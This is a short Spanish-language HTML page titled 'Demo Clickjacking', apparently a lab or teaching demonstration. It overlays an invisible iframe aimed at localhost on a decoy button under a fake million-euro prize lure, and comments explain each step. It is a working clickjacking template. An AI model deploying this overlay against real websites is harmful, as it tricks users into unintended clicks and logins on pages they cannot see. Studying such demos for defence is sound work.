<!doctype html>
 <html lang="es"></html>
  <head>
  <meta charset="UTF-8">
  <title>Demo Clickjacking</title>
  <link rel="stylesheet" href="http://localhost:81/css/estilo_principal.css">
  <style>
    /* contenedor que "prepara" la trampa */
      .contenedor {
        position: relative; 
            width: 300px; 
            height: 50px; 
            margin-top: 50px;
            margin-left: 50px;
        }
        /*botón falso:*/
      #decoy {
        position: absolute;
            top: 0;
            left: 0;
            width: 100  %;
            height: 100%;
            font-size: 15px;
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px;
            z-index: 1; /*  DEBAJO del iframe */
        }
        /* iframe invisible (la víctima) */
        #iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;  /*   mismo tamaño que el botón */
            height: 100%; /* mismo tamaño que el botón */
      
            opacity: 0;   /* INVISIBLE      opacidad 0.5 xa pruebas  */
            z-index: 2;   /* ENCIMA del botón */
        }
    </style>
  </head>
  <body>
      <h2>¡Enhorabuena, acabas de ganar UN MILLÓN DE EUROS!</h2> 
      <p>¡Solo tienes que iniciar sesión para reclamar tu premio!</p>
    <div class="contenedor">
        
        <input type="button" id="decoy" value="PULSA AQUÍ para reclamar" onclick="alert('¡Has caído en la trampa! SKILL ISSUE')">
        
        <iframe id="iframe" src="http://localhost:81"></iframe>
    
    </div>
    
  </body>
</html>
